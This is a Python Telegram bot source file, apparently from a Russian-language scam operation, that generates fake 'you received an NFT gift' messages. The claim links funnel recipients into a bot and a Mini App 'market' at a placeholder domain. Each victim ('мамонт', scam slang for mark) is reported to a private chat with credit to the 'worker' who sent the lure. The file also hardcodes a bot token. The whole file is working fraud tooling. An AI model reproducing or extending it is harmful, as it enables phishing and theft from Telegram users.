import os
import uuid
import json
import asyncio
import sqlite3
import logging
from datetime import datetime
from aiogram.types import FSInputFile
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    WebAppInfo
)
from aiogram.filters import CommandStart, CommandObject, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties
from aiogram import types


# Настройка логирования
logging.basicConfig(level=logging.INFO)


# ================== БАЗА ДАННЫХ ==================

class Database:
    def __init__(self, path="bot_data.db"):
        self.path = path
        self.init()

    def _exec(self, q, params=(), one=False, all=False, commit=False):
        with sqlite3.connect(self.path) as conn:
            conn.row_factory = sqlite3.Row
            cur = conn.cursor()
            cur.execute(q, params)
            if commit:
                conn.commit()
            if one:
                r = cur.fetchone()
                return dict(r) if r else None
            if all:
                return [dict(x) for x in cur.fetchall()]
            return None

    def init(self):
        self._exec("""
            CREATE TABLE IF NOT EXISTS nft_gifts (
                gift_id TEXT PRIMARY KEY,
                creator_user_id INTEGER,
                creator_username TEXT,
                nft_link TEXT,
                nft_title TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """, commit=True)

        self._exec("""
            CREATE TABLE IF NOT EXISTS user_inventory (
                user_id INTEGER PRIMARY KEY,
                nft_list TEXT DEFAULT '[]',
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """, commit=True)

    def create_nft(self, gift_id, creator_user_id, creator_username, link, title):
        self._exec(
            "INSERT INTO nft_gifts (gift_id, creator_user_id, creator_username, nft_link, nft_title) VALUES (?,?,?,?,?)",
            (gift_id, creator_user_id, creator_username, link, title),
            commit=True
        )

    def get_nft(self, gift_id):
        return self._exec("SELECT * FROM nft_gifts WHERE gift_id=?", (gift_id,), one=True)

    def add_nft_to_user(self, user_id, link, title):
        row = self._exec("SELECT nft_list FROM user_inventory WHERE user_id=?", (user_id,), one=True)
        nft_list = json.loads(row["nft_list"]) if row else []

        if any(n["link"] == link for n in nft_list):
            return False

        nft_list.append({
            "link": link,
            "title": title,
            "received_at": datetime.now().isoformat()
        })

        new_json = json.dumps(nft_list)

        self._exec("""
            INSERT INTO user_inventory (user_id, nft_list, updated_at)
            VALUES (?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET nft_list=?, updated_at=CURRENT_TIMESTAMP
        """, (user_id, new_json, new_json), commit=True)

        return True

    def get_user_nfts(self, user_id):
        row = self._exec("SELECT nft_list FROM user_inventory WHERE user_id=?", (user_id,), one=True)
        return json.loads(row["nft_list"]) if row else []


# ================== AIOGRAM БОТ ==================

db = Database()

bot = Bot(
    token="8575754417:AAE_Wpww7QlfnPYI6fMVzB8h143tKx5ReGI",
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()


# ================== /start ==================

@dp.message(CommandStart())
async def start_cmd(message: Message, command: CommandObject):

    start_arg = command.args

    # Обработка /start claim_nft_xxx
    if start_arg and start_arg.startswith("claim_nft_"):
        await handle_claim(message, start_arg.replace("claim_nft_", ""))
        return

    # Кнопки Mini App + канал
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🛒 Открыть Market",
                    web_app=WebAppInfo(url="https://dsafsfasdfsaasd.com/")
                )
            ],
            [
                InlineKeyboardButton(
                    text="📢 Наш канал",
                    url="https://t.me/GIFTSWIFTru"
                )
            ]
        ]
    )

    # Отправка фото
    await message.answer_photo(
        photo=FSInputFile("photo1.jpg"),
        caption=(
            "<b>Добро пожаловать в GIFTSWIFT</b>\n\n"
            "Покупай и продавай подарки прямо в Telegram через Mini App!"
        ),
        reply_markup=kb
    )


# ================== ИНЛАЙН ЧЕК ==================

@dp.inline_query()
async def inline_handler(query: InlineQuery):
    """Обработка inline-запросов для создания NFT-чеков"""

    # --- Текст inline-запроса ---
    text = (query.query or "").strip()

    # Если ссылка не NFT — возвращаем пустой список
    if not text.startswith("https://t.me/nft/"):
        await bot.answer_inline_query(query.id, results=[], cache_time=1)
        return

    try:
        # --- Парсинг ссылки ---
        nft_link = text
        raw_title = nft_link.split("/")[-1]

        if "-" in raw_title:
            name, number = raw_title.rsplit("-", 1)
        else:
            name = raw_title
            number = ""

        inline_title = f"{name} #{number}" if number else name

        # Генерируем ID подарка
        gift_id = uuid.uuid4().hex[:8]
        
        # Воркеры йоу
        creator_username = query.from_user.username or f"Воркер:{query.from_user.id}"
        
        # --- Сохранение в БД (исправлено: было дублирование) ---
        db.create_nft(gift_id, query.from_user.id, creator_username, nft_link, raw_title)

        # Узнаём username бота
        me = await bot.get_me()
        bot_username = me.username

        # --- Текст с предпросмотром ---
        inline_text = (
            f"<a href=\"{nft_link}\">&#8205;</a>"  # невидимая ссылка для предпросмотра
            f"🎁 <b>Вам передали NFT:</b> "
            f"<a href=\"{nft_link}\">{inline_title}</a>\n\n"
            "<b>Теперь он находится в разделе \"мои подарки\" и доступен к выводу ✅</b>\n\n"
            "<i>Учтите, что подарок можно вывести только с аккаунта, на который он был отправлен.</i>\n\n"
            "Для перехода на маркет нажмите кнопку ниже."
        )

        # --- Inline результат ---
        result = InlineQueryResultArticle(
            id=gift_id,
            title=f"🎁 NFT: {name}",
            description="Создать NFT подарок",
            input_message_content=InputTextMessageContent(
                message_text=inline_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=False
            ),
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="🎁 Забрать NFT",
                            url=f"https://t.me/{bot_username}?start=claim_nft_{gift_id}"
                        )
                    ]
                ]
            )
        )

        # --- Ответ на inline-запрос ---
        await bot.answer_inline_query(
            query.id,
            results=[result],
            cache_time=0
        )

    except Exception as e:
        logging.error(f"Error in inline_handler: {e}", exc_info=True)

        await bot.answer_inline_query(
            query.id,
            results=[
                InlineQueryResultArticle(
                    id="error",
                    title="❌ Ошибка",
                    description="Не удалось создать NFT чек",
                    input_message_content=InputTextMessageContent(
                        message_text=f"❌ Ошибка: {e}"
                    )
                )
            ],
            cache_time=1
        )


# ================== ПОЛУЧЕНИЕ NFT ==================

async def handle_claim(message: Message, gift_id: str):
    gift = db.get_nft(gift_id)
    user_id = message.from_user.id
    user_username = message.from_user.username or f"Мамонт:{user_id}"

    if not gift:
        await message.answer("❌ Подарок не найден.")
        return

    raw_title = gift["nft_title"]
    if "-" in raw_title:
        name, number = raw_title.split("-", 1)
    else:
        name = raw_title
        number = ""

    show_title = name
    full_title = f"{name} #{number}" if number else name
    link = gift["nft_link"]

    added = db.add_nft_to_user(user_id, link, full_title)
    if not added:
        await message.answer("❌ Вы уже получали этот подарок ранее.")
        return

    await message.answer(
        f"🎁 <b>Вы получили подарок: </b>"
        f"<a href=\"{link}\">{show_title}</a>\n\n"
        f"✅ Он находится в вашем инвентаре"
    )
    
    creator_id = gift["creator_user_id"]
    creator_username = gift["creator_username"]
    chat_krutoy = -1003370834162
    
    try:
        if creator_id != user_id:
            await bot.send_message(chat_krutoy, f"Мамонт @{user_username} перешел в бота от {creator_username}")
    except Exception as e:
        logging.error(f"❌ Не удалось отправить сообщение: {e}")
    
    # имитация /start 
    await start_cmd(message, CommandObject(command="start", args=None))


# ================== МОИ ПОДАРКИ ==================

@dp.callback_query(F.data == "my_gifts")
async def show_gifts(callback: CallbackQuery):
    uid = callback.from_user.id
    items = db.get_user_nfts(uid)

    if not items:
        await callback.message.edit_text("🎁 <b>У вас пока нет подарков</b>")
        return

    text = "🎁 <b>Мои подарки:</b>\n\n"
    for i, nft in enumerate(items, 1):
        text += f"{i}. <a href='{nft['link']}'>{nft['title']}</a>\n"

    await callback.message.edit_text(text)


# ================== ЗАПУСК ==================

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())